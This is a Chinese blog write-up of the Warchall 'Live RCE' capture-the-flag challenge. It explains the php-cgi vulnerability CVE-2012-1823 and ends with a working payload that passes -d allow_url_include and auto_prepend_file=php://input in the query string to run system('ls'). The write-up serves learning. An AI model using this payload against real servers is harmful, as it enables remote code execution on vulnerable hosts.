---
title: weChall-Warchall Live RCE
date: 2017-12-18 20:42:00
tags: [WEB]
categories: CTF
---
## 前言
这一题确实以前没见过，怪我见识少咯！这是一道关于php-cgi的题目，要利用其在PHP低版本的公开漏洞`CVE-2012-1823`。
## 分析
首页给我的展示
```php
Live RCE!

Hello Guest!

Here are your $_SERVER vars:

Array
(
    [REDIRECT_UNIQUE_ID] => Wjezv7A6WcMAAAoRCTkAAAAA
    [REDIRECT_HANDLER] => application/x-httpd-php5-cgi
    [REDIRECT_STATUS] => 200
    [UNIQUE_ID] => Wjezv7A6WcMAAAoRCTkAAAAA
    [HTTP_HOST] => rce.warchall.net
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
    [HTTP_ACCEPT] => text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    [HTTP_ACCEPT_LANGUAGE] => zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    [HTTP_ACCEPT_ENCODING] => gzip, deflate
    [HTTP_CONNECTION] => keep-alive
    [HTTP_UPGRADE_INSECURE_REQUESTS] => 1
    [PATH] => /bin:/sbin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/i686-pc-linux-gnu/gcc-bin/5.4.0:/opt/bin
    [SERVER_SIGNATURE] => 
Apache Server at rce.warchall.net Port 80


    [SERVER_SOFTWARE] => Apache
    [SERVER_NAME] => rce.warchall.net
    [SERVER_ADDR] => 176.58.89.195
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 119.36.85.130
    [DOCUMENT_ROOT] => /home/level/20_live_rce/www
    [SERVER_ADMIN] => [no address given]
    [SCRIPT_FILENAME] => /home/level/20_live_rce/www/index.php
    [REMOTE_PORT] => 43691
    [REDIRECT_URL] => /index.php
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => GET
    [QUERY_STRING] => 
    [REQUEST_URI] => /index.php
    [SCRIPT_NAME] => /index.php
    [ORIG_SCRIPT_FILENAME] => /usr/bin/php53-cgi/php-cgi
    [ORIG_PATH_INFO] => /index.php
    [ORIG_PATH_TRANSLATED] => /home/level/20_live_rce/www/index.php
    [ORIG_SCRIPT_NAME] => /local-bin/php-cgi
    [PHP_SELF] => /index.php
    [REQUEST_TIME] => 1513599935
)

Kind Regards
The Warchall staff!
```
开始也没看出有啥毛病，不就是显示了$_SERVER变量的内容吗，咋利用啊？后来反复看了几遍，想着可能只有php-cgi这有什么漏洞吧。于是百度了一下果然有，就是`CVE-2012-1823`的PHP远程代码执行漏洞，曾经还轰动一时。乖乖，怪自己学识太少，这都不知道。
## 知识点
这里直接引用了[这篇博文](https://paper.seebug.org/297/)的一段话
>php-cgi也是一个sapi。在远古的时候，web应用的运行方式很简单，web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork出一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，同时这个解释器子进程也就结束了。基于bash、perl等语言的web应用多半都是以这种方式来执行，这种执行方式一般就被称为cgi，在安装Apache的时候默认有一个cgi-bin目录，最早就是放置这些cgi脚本用的。

>但cgi模式有个致命的缺点，众所周知，进程的创建和调度都是有一定消耗的，而且进程的数量也不是无限的。所以，基于cgi模式运行的网站通常不能同时接受大量请求，否则每个请求生成一个子进程，就有可能把服务器挤爆。于是后来就有了fastcgi，fastcgi进程可以将自己一直运行在后台，并通过fastcgi协议接受数据包，执行后返回结果，但自身并不退出。

>php有一个叫php-cgi的sapi，php-cgi有两个功能，一是提供cgi方式的交互，二是提供fastcgi方式的交互。也就说，我们可以像perl一样，让web容器直接fork一个php-cgi进程执行某脚本；也可以在后台运行php-cgi -b 127.0.0.1:9000（php-cgi作为fastcgi的管理器），并让web容器用fastcgi协议和9000交互。

>那我之前说的fpm又是什么呢？为什么php有两个fastcgi管理器？php确实有两个fastcgi管理器，php-cgi可以以fastcgi模式运行，fpm也是以fastcgi模式运行。但fpm是php在5.3版本以后引入的，是一个更高效的fastcgi管理器，其诸多优点我就不多说了，可以自己去翻翻源码。因为fpm优点更多，所以现在越来越多的web应用使用php-fpm去运行php。
>CVE-2012-1823就是php-cgi这个sapi出现的漏洞，我上面介绍了php-cgi提供的两种运行方式：cgi和fastcgi，本漏洞只出现在以cgi模式运行的php中。
这个漏洞简单来说，就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。
探究一下原理，RFC3875中规定，当querystring中不包含没有解码的=号的情况下，要将querystring作为cgi的参数传入。所以，Apache服务器按要求实现了这个功能。
但PHP并没有注意到RFC的这一个规则，也许是曾经注意并处理了，处理方法就是web上下文中不允许传入参数。

## 解决
看了上面的知识点就知道了如何利用了，于是有了下面的payload
```php
POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input

POST data: <?php system('ls');?>
```